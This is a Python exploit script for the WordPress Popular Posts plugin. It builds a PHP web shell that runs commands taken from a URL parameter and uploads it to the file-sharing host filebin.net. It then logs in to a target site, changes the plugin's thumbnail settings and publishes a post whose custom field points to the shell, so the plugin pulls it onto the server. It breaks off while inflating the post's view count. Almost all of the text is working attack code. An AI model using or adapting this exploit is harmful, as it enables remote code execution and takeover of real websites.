import requests
import json
import re

# Variables
target_ip = "target_IP"
target_port = "PORT"
wp_path = "/"
username = "USER"
password = "PASS"
base_url = f"https://{target_ip}:{target_port}{wp_path}"

# Shell name and payload
shell_name = 'exploit.gif.php'
payload = 'GIF <html><body> <form method="GET" name="<?php echo basename($_SERVER[\'PHP_SELF\']); ?>"> <input type="TEXT" name="cmd" autofocus id="cmd" size="80"> <input type="SUBMIT" value="Execute"> </form> <pre> <?php if(isset($_GET[\'cmd\'])) { system($_GET[\'cmd\']); } ?> </pre> </body></html>'

print('')
print('[*] Starting Exploit:')

'''
Upload file to Filebin
'''
try:
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'filename': shell_name
    }
    files = {'file': (shell_name, payload)}
    file_json = requests.post('https://filebin.net/', files=files, headers=headers)
    if file_json.status_code == 201:
        resp = file_json.json()
        bin_id = resp['bin']['id']
        filename = resp['file']['filename']
        PHP_URL = f"https://filebin.net/{bin_id}/{filename}"
        print(f'[+] Web Shell successfully uploaded at [{PHP_URL}].')
    else:
        print(f'[-] Error: Filebin returned status code {file_json.status_code}')
        print(f'[-] Response: {file_json.text}')
        exit()
except requests.exceptions.RequestException as e:
    print(f'[-] Error connecting to Filebin: {e}')
    exit()

'''
Authentication
'''
session = requests.Session()
auth_url = base_url + 'wp-login.php'

# Header
header = {
    'Host': target_ip,
    'User-Agent': 'Monies Browser 1.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://' + target_ip,
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1'
}

# Body
body = {
    'log': username,
    'pwd': password,
    'wp-submit': 'Log In',
    'testcookie': '1'
}

# Authenticate
auth = session.post(auth_url, headers=header, data=body)
auth_header = auth.headers['Set-Cookie']
if 'wordpress_logged_in' in auth_header:
    print(f'[+] Authentication successful as user [{username}] !')
else:
    print('[-] Authentication failed ! Check username and password')
    exit()

# Verify session is still valid
check_url = base_url + 'wp-admin/'
check_response = session.get(check_url)
if 'wp-admin' not in check_response.url:
    print('[-] Error: Session expired after authentication! Redirected to:', check_response.url)
    exit()
print('[+] Session is still valid.')

'''
Verify that the requirements are installed
'''
settings_page_url = base_url + 'wp-admin/options-general.php?page=wordpress-popular-posts&tab=debug'
settings_page = session.get(settings_page_url).text
search_string = ' gd'
if settings_page.find(search_string) == -1:
    print('[-] Error, gd extension for PHP is not installed/enabled on the server ! WPP can\'t generate thumbnails.')
    exit()

'''
Get the wpp-admin-token
'''
settings_page_url = base_url + 'wp-admin/options-general.php?page=wordpress-popular-posts&tab=tools'

settings_page = session.get(settings_page_url).text
search_string = '<input type="hidden" id="wpp-admin-token" name="wpp-admin-token" value="'
search_string_end = '" />'
settings_page = settings_page[settings_page.find(search_string):]
wpp_admin_token = settings_page[72: settings_page.find(search_string_end)]
if wpp_admin_token:
    print(f'[+] Acquired wpp-admin-token [{wpp_admin_token}].')
else:
    print('[-] Error while gathering wpp-admin-token !')
    exit()

# Extract WPP nonce for AJAX actions
nonce_patterns = [
    r'var WPPConfig = {[^}]*"nonce":"([^"]+)"',  # Primary pattern
    r'wpp_nonce[^>]*value="([^"]+)"',            # Fallback: Look for wpp_nonce in input fields
    r'nonce[^>]*value="([^"]+)"',                # Generic nonce field
    r'"nonce":"([^"]+)"',                        # Generic JSON nonce
    r'var wpp_nonce = "([^"]+)"'                 # Another common pattern
]
wpp_nonce = None
for pattern in nonce_patterns:
    nonce_match = re.search(pattern, settings_page)
    if nonce_match:
        wpp_nonce = nonce_match.group(1)
        print(f'[+] Acquired WPP AJAX nonce using pattern {pattern}: {wpp_nonce}')
        break
if not wpp_nonce:
    print('[-] Warning: Could not find WPP AJAX nonce! Falling back to wp_nonce.')
    wpp_nonce = None  # Will be set later

'''
Attempt to find WPP AJAX nonce from a frontend page
'''
print('[+] Attempting to find WPP AJAX nonce from a frontend page...')
frontend_page_url = base_url  # Try the homepage
frontend_response = session.get(frontend_page_url)
if frontend_response.status_code == 200:
    frontend_page = frontend_response.text
    nonce_match = re.search(r'var WPPConfig = {[^}]*"nonce":"([^"]+)"', frontend_page)
    if nonce_match:
        wpp_nonce = nonce_match.group(1)
        print(f'[+] Acquired WPP AJAX nonce from frontend page: {wpp_nonce}')
    else:
        print('[-] Warning: Could not find WPP AJAX nonce in frontend page!')
else:
    print(f'[-] Warning: Failed to access frontend page, status code: {frontend_response.status_code}')

'''
Apply changes to the Popular Posts plugin
'''
body = {
    'upload_thumb_src': '',
    'thumb_source': 'custom_field',
    'thumb_lazy_load': 0,  # Disable lazy load to force thumbnail generation
    'thumb_field': 'wpp_thumbnail',
    'thumb_field_resize': 1,
    'section': 'thumb',
    'wpp-admin-token': wpp_admin_token
}
applied_changes = session.post(settings_page_url, headers=header, data=body).text
if applied_changes.find('<div class="notice notice-success is-dismissible"><p><strong>Settings saved.'):
    print(f'[+] Settings applied successfully to the Popular Posts plugin. ')
else:
    print('[-] Error while applying settings to the Popular Posts plugin!')
    exit()

'''
Verify plugin settings for thumbnail generation
'''
print('[+] Verifying plugin settings for thumbnail generation...')
settings_page = session.get(settings_page_url).text
# Check if thumbnail generation is enabled
if 'thumb_field_resize' in settings_page and 'value="1"' in settings_page:
    print('[+] Thumbnail generation is enabled in plugin settings.')
else:
    print('[-] Warning: Thumbnail generation might not be enabled! Attempting to reapply settings...')
    body = {
        'upload_thumb_src': '',
        'thumb_source': 'custom_field',
        'thumb_lazy_load': 0,
        'thumb_field': 'wpp_thumbnail',
        'thumb_field_resize': 1,
        'section': 'thumb',
        'wpp-admin-token': wpp_admin_token
    }
    applied_changes = session.post(settings_page_url, headers=header, data=body).text
    if applied_changes.find('<div class="notice notice-success is-dismissible"><p><strong>Settings saved.'):
        print('[+] Reapplied plugin settings with thumbnail generation enabled.')
    else:
        print('[-] Error: Failed to reapply plugin settings for thumbnail generation!')
        exit()

# Clear cache again to ensure the plugin reprocesses posts
body = {
    'action': 'wpp_clear_thumbnail',
    'wpp-admin-token': wpp_admin_token
}
session.post(settings_page_url, headers=header, data=body)
print('[+] Cleared thumbnail cache again to force regeneration.')

'''
Empty image cache
'''
body = {
    'action': 'wpp_clear_thumbnail',
    'wpp-admin-token': wpp_admin_token
}
applied_changes = session.post(settings_page_url, headers=header, data=body).text
print(f'[+] Images cache cleared. ')

'''
Get the new post ID and Nonce
'''
new_post_url = base_url + 'wp-admin/post-new.php'

# Verify session is still valid before accessing post-new.php
check_url = base_url + 'wp-admin/'
check_response = session.get(check_url)
if 'wp-admin' not in check_response.url:
    print('[-] Error: Session expired before accessing post-new.php! Redirected to:', check_response.url)
    exit()
print('[+] Session is still valid before accessing post-new.php.')

new_post_response = session.get(new_post_url)
print(f'[+] Status code for {new_post_url}: {new_post_response.status_code}')
if new_post_response.history:
    print(f'[+] Redirected to: {new_post_response.url}')
new_post_page = new_post_response.text

# Save the page for debugging
with open("post_new.html", "w", encoding="utf-8") as f:
    f.write(new_post_page)
print('[+] Saved post-new.php content to post_new.html for debugging.')

# Extract Post ID from the initial page
post_ID = None
post_id_match = re.search(r'<input[^>]*id="post_ID"[^>]*value="(\d+)"', new_post_page)
if post_id_match:
    post_ID = post_id_match.group(1)
    print(f'[+] Extracted raw post ID from input field in post_new.html: {post_ID}')
else:
    print('[-] Error: Could not find post ID in the input field in post_new.html!')
    # Debug: Print the surrounding content
    search_string = 'id="post_ID"'
    start_idx = new_post_page.find(search_string)
    if start_idx != -1:
        start_snippet = max(0, start_idx - 100)
        end_snippet = min(len(new_post_page), start_idx + 100)
        snippet = new_post_page[start_snippet:end_snippet]
        print(f'[+] Debug: Found id="post_ID" in post_new.html, surrounding content: {snippet}')
    else:
        print('[-] Debug: id="post_ID" not found in post_new.html at all!')
        # Additional debug: Check for any signs of a draft post
        if 'wp-admin/post.php?post=' in new_post_page:
            print('[+] Debug: Found reference to a post in the page, extracting...')
            post_id_match = re.search(r'wp-admin/post.php\?post=(\d+)', new_post_page)
            if post_id_match:
                post_ID = post_id_match.group(1)
                print(f'[+] Extracted post ID from post.php URL: {post_ID}')
        # Check if the page indicates a redirect or error
        if '<title>WordPress â€º Error</title>' in new_post_page:
            print('[-] Debug: Page contains an error message!')
            error_start = new_post_page.find('<div id="error-page">')
            if error_start != -1:
                error_end = new_post_page.find('</div>', error_start)
                error_message = new_post_page[error_start:error_end + 6]
                print(f'[-] Debug: Error message: {error_message}')
        # Check the page title to ensure we're on the correct page
        title_match = re.search(r'<title>(.*?)</title>', new_post_page)
        if title_match:
            page_title = title_match.group(1)
            print(f'[+] Debug: Page title: {page_title}')
            # Check for keywords in multiple languages
            if not any(keyword in page_title.lower() for keyword in ['add new post', 'ajouter un nouvel article', 'new post', 'nouvel article']):
                print('[-] Debug: Not on the Add New Post page! Possible redirect or permission issue.')
        # Check for user permissions
        if 'You need a higher level of permission' in new_post_page or 'Sorry, you are not allowed to access this page' in new_post_page:
            print('[-] Debug: User lacks sufficient permissions to create a post!')
            # Extract the full error message
            error_start = new_post_page.find('<div class="wrap">')
            if error_start != -1:
                error_end = new_post_page.find('</div>', error_start)
                error_message = new_post_page[error_start:error_end + 6]
                print(f'[-] Debug: Permission error message: {error_message}')
            exit()
        # Fallback: Try wp.media.model.settings.post.id
        search_string = 'wp.media.model.settings.post.id = '
        search_string_end = ';'
        start_idx = new_post_page.find(search_string)
        if start_idx != -1:
            start_idx += len(search_string)
            end_idx = new_post_page.find(search_string_end, start_idx)
            post_ID = new_post_page[start_idx:end_idx].strip()
            print(f'[+] Extracted raw post ID from wp.media.model.settings in post_new.html: {post_ID}')
        else:
            print('[-] Error: Could not find post ID in wp.media.model.settings in post_new.html!')

# Extract screenoptionnonce for enabling metaboxes
search_string = 'name="screenoptionnonce" value="'
search_string_end = '"'
start_idx = new_post_page.find(search_string)
if start_idx != -1:
    start_idx += len(search_string)
    end_idx = new_post_page.find(search_string_end, start_idx)
    screenoptionnonce = new_post_page[start_idx:end_idx]
    print(f'[+] Fetched screenoptionnonce: {screenoptionnonce}')
else:
    print('[-] Warning: Could not find screenoptionnonce. Proceeding without enabling metaboxes.')

# Extract WP nonce
search_string = 'wp.apiFetch.nonceMiddleware = wp.apiFetch.createNonceMiddleware( "'
search_string_end = '"'
start_idx = new_post_page.find(search_string)
if start_idx == -1:
    # Fallback: Look for _wpnonce as the REST API nonce
    search_string = 'name="_wpnonce" value="'
    start_idx = new_post_page.find(search_string)
    if start_idx == -1:
        print('[-] Error: Could not find wp_apiFetch nonce or _wpnonce in the page!')
        exit()
start_idx += len(search_string)
end_idx = new_post_page.find(search_string_end, start_idx)
wp_nonce = new_post_page[start_idx:end_idx]

# Use wpp_nonce if it was extracted, otherwise use wp_nonce
if 'wpp_nonce' not in locals() or wpp_nonce is None:
    wpp_nonce = wp_nonce
    print('[+] Using wp_nonce as fallback for WPP AJAX nonce.')

# Enable Custom Fields metabox
print('[+] Attempting to enable Custom Fields metabox...')
# Step 1: Check current screen options
screen_options_url = base_url + 'wp-admin/post-new.php'
body = {
    'action': 'closed-postboxes',
    'closed': '',
    'hidden': '',
    'page': 'post',
    'screen': 'post',
    'screenoptionnonce': screenoptionnonce if 'screenoptionnonce' in locals() else '',
    '_wpnonce': wp_nonce
}
session.post(screen_options_url, headers=header, data=body)
print('[+] Sent closed-postboxes request.')

# Step 2: Explicitly enable Custom Fields via screen options
body = {
    'action': 'screen-options-apply',
    'screenoptionnonce': screenoptionnonce if 'screenoptionnonce' in locals() else '',
    'screen': 'post',
    'meta-box-order-nonce': '',
    'closedpostboxesnonce': '',
    'postcustom-hide': '0',  # Ensure Custom Fields is not hidden
    'wp_screen_options[option]': 'metaboxhidden_post',
    'wp_screen_options[value]': '',  # Clear hidden metaboxes
    '_wpnonce': wp_nonce
}
session.post(screen_options_url, headers=header, data=body)
print('[+] Sent screen-options-apply request to enable Custom Fields.')

# Step 3: Reload the page to get the updated content
new_post_response = session.get(new_post_url)
new_post_page = new_post_response.text
with open("post_new_updated.html", "w", encoding="utf-8") as f:
    f.write(new_post_page)
print('[+] Saved updated post-new.php content to post_new_updated.html for debugging.')

# Step 4: Check if the metabox is now visible
if 'id="postcustom"' not in new_post_page:
    print('[-] Warning: Custom Fields metabox still not found! Attempting to enable via user meta...')
    # Update user meta directly to show the Custom Fields metabox
    user_meta_url = base_url + 'wp-admin/user-edit.php'
    body = {
        'action': 'update',
        'user_id': '',  # Will be filled by WordPress based on the logged-in user
        'metaboxhidden_post': '',  # Clear hidden metaboxes
        '_wpnonce': wp_nonce
    }
    session.post(user_meta_url, headers=header, data=body)
    # Reload the page again
    new_post_response = session.get(new_post_url)
    new_post_page = new_post_response.text
    with open("post_new_updated_2.html", "w", encoding="utf-8") as f:
        f.write(new_post_page)
    print('[+] Saved updated post-new.php content to post_new_updated_2.html for debugging.')
    if 'id="postcustom"' not in new_post_page:
        print('[-] Error: Custom Fields metabox could not be enabled!')

# If post_ID wasn't found earlier, try again in the updated page
if post_ID is None:
    post_id_match = re.search(r'<input[^>]*id="post_ID"[^>]*value="(\d+)"', new_post_page)
    if post_id_match:
        post_ID = post_id_match.group(1)
        print(f'[+] Extracted raw post ID from input field in post_new_updated.html: {post_ID}')
    else:
        print('[-] Error: Could not find post ID in the input field in post_new_updated.html!')
        # Debug: Print the surrounding content
        search_string = 'id="post_ID"'
        start_idx = new_post_page.find(search_string)
        if start_idx != -1:
            start_snippet = max(0, start_idx - 100)
            end_snippet = min(len(new_post_page), start_idx + 100)
            snippet = new_post_page[start_snippet:end_snippet]
            print(f'[+] Debug: Found id="post_ID" in post_new_updated.html, surrounding content: {snippet}')
        else:
            print('[-] Debug: id="post_ID" not found in post_new_updated.html at all!')

# Convert post_ID to integer and validate
try:
    post_ID = int(post_ID)
    if post_ID == 0:
        print('[-] Warning: Extracted post ID is 0, which is not a valid post ID!')
        post_ID = None  # Trigger fallback
except (ValueError, TypeError):
    print('[-] Error: Extracted post ID is not a valid integer:', post_ID)
    post_ID = None  # Trigger fallback

# Fallback: Create a post via REST API if post_ID is not found or invalid
if post_ID is None:
    print('[+] Fallback: Creating a new post via REST API to get post ID...')
    create_post_url = base_url + 'index.php/wp-json/wp/v2/posts?_locale=user'
    header['X-WP-Nonce'] = wp_nonce
    header['Content-Type'] = 'application/json'
    data = {
        "title": "Draft Post for Exploit",
        "content": "This is a draft post created for the exploit.",
        "status": "draft"
    }
    create_post_response = session.post(create_post_url, headers=header, json=data)
    if create_post_response.status_code == 201:
        post_data = create_post_response.json()
        post_ID = post_data['id']
        print(f'[+] Created new post via REST API with ID: {post_ID}')
    else:
        print('[-] Error: Could not create post via REST API!')
        print(f'[-] Status code: {create_post_response.status_code}')
        print(f'[-] Response: {create_post_response.text}')
        exit()

# Extract AJAX nonce (try _ajax_nonce-add-meta first)
search_string = 'name="_ajax_nonce-add-meta" value="'
search_string_end = '"'
start_idx = new_post_page.find(search_string)
if start_idx != -1:
    start_idx += len(search_string)
    end_idx = new_post_page.find(search_string_end, start_idx)
    ajax_nonce = new_post_page[start_idx:end_idx]
    print(f'[+] Fetched AJAX nonce from _ajax_nonce-add-meta: {ajax_nonce}')
else:
    print('[-] Error: Could not find _ajax_nonce-add-meta! Debugging page content...')
    # Check if the Custom Fields metabox is visible
    if 'id="postcustom"' not in new_post_page:
        print('[-] Warning: Custom Fields metabox not found in the page!')
    else:
        print('[+] Debug: Custom Fields metabox is present, but nonce not found!')
    # Fallback: Try _ajax_linking_nonce
    search_string = 'name="_ajax_linking_nonce" value="'
    start_idx = new_post_page.find(search_string)
    if start_idx != -1:
        start_idx += len(search_string)
        end_idx = new_post_page.find(search_string_end, start_idx)
        ajax_nonce = new_post_page[start_idx:end_idx]
        print(f'[+] Fetched AJAX nonce from _ajax_linking_nonce: {ajax_nonce}')
    else:
        print('[-] Error: Could not find _ajax_linking_nonce either!')
        # Fallback: Try other patterns
        nonce_patterns = [
            'name="_wpnonce" value="',
            'name="nonce" value="',
            'id="nonce" value="'
        ]
        for pattern in nonce_patterns:
            search_string = pattern
            start_idx = new_post_page.find(search_string)
            if start_idx != -1:
                start_idx += len(search_string)
                end_idx = new_post_page.find(search_string_end, start_idx)
                ajax_nonce = new_post_page[start_idx:end_idx]
                print(f'[+] Fetched AJAX nonce from {pattern}: {ajax_nonce}')
                break
        if 'ajax_nonce' not in locals():
            print('[-] Error: Could not find any nonce in the page!')
            exit()

# Final validation
if post_ID and post_ID > 0 and wp_nonce and ajax_nonce:
    print(f'[+] Acquired new post ID [{post_ID}], WP Nonce [{wp_nonce}] and AJAX Nonce [{ajax_nonce}].')
else:
    if not post_ID or post_ID <= 0:
        print('[-] Error while gathering post_ID !')
    elif not wp_nonce:
        print('[-] Error while gathering Wordpress Nonce !')
    elif not ajax_nonce:
        print('[-] Error while gathering Wordpress AJAX Nonce !')
    exit()

'''
Publish a new post
'''
new_post_url = base_url + 'index.php/wp-json/wp/v2/posts/'+str(post_ID)+'?_locale=user'

data = {"id":post_ID,"title":"I'm the one who knocks","content":"<!-- wp:paragraph -->\n<p>upgrade your plugins</p>\n<!-- /wp:paragraph -->","status":"publish"}
header['X-WP-Nonce'] = wp_nonce
header['Content-Type'] = 'application/json'
header['X-HTTP-Method-Override'] = 'PUT'
new_post_page = session.post(new_post_url, headers=header, json=data).text
if new_post_page.find('"status":"publish"'):
    print(f'[+] New post named [I\'m the one who knocks] published correctly!')
else:
    print('[-] Error while publishing the new post !')
    exit()

'''
Add the Custom Field
'''
new_post_url = base_url + 'wp-admin/admin-ajax.php'

header.pop('X-WP-Nonce')
header['Content-Type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
header.pop('X-HTTP-Method-Override')
header['Accept']='*/*'
header['X-Requested-With'] = 'XMLHttpRequest'
header['Referer'] = base_url + 'wp-admin/post-new.php'
body = {
    '_ajax_nonce-add-meta': ajax_nonce,
    'action': 'add-meta',
    'metakeyselect': 'wpp_thumbnail',
    'metakeyinput': "",
    'metavalue': PHP_URL,
    'post_id': post_ID
}
print(f'[+] Sending request to {new_post_url} with body: {body}')
new_post_page = session.post(new_post_url, headers=header, data=body)
if new_post_page.status_code != 200:
    print(f'[-] Error: Server returned status code {new_post_page.status_code}')
    print(f'[-] Response headers: {new_post_page.headers}')
    new_post_page = new_post_page.text
    print(f'[-] Error while adding the custom field !')
    print(f'[-] Response: {new_post_page}')
    # Fallback: Add custom field via REST API
    custom_field_url = base_url + 'index.php/wp-json/wp/v2/posts/' + str(post_ID)
    header['X-WP-Nonce'] = wp_nonce
    header['Content-Type'] = 'application/json'
    data = {
        'meta': {
            'wpp_thumbnail': PHP_URL
        }
    }
    custom_field_response = session.post(custom_field_url, headers=header, json=data)
    if custom_field_response.status_code == 200:
        print('[+] Added a new Custom Field with the uploaded web shell via REST API.')
    else:
        print('[-] Error while adding the custom field via REST API!')
        print(f'[-] Status code: {custom_field_response.status_code}')
        print(f'[-] Response: {custom_field_response.text}')
        exit()
else:
    new_post_page = new_post_page.text
    if new_post_page.find("<tr id='meta-") > 0:
        print(f'[+] Added a new Custom Field with the uploaded web shell.')
    else:
        print('[-] Error while adding the custom field !')
        print(f'[-] Response: {new_post_page}')
        exit()

'''
Give it some views to pop it up in the recent posts
'''
print(f'[+] Giving the new post some views (10) [ ', end="")

new_post_url = base_url + 'index.php?page_id=' + str(post_ID)
redirect_url = session.get(new_post_url).url
print(f'[+] Post redirect URL: {redirect_url}')

# Simulate frontend views as an unauthenticated user
public_session = requests.Session()
public_headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.447
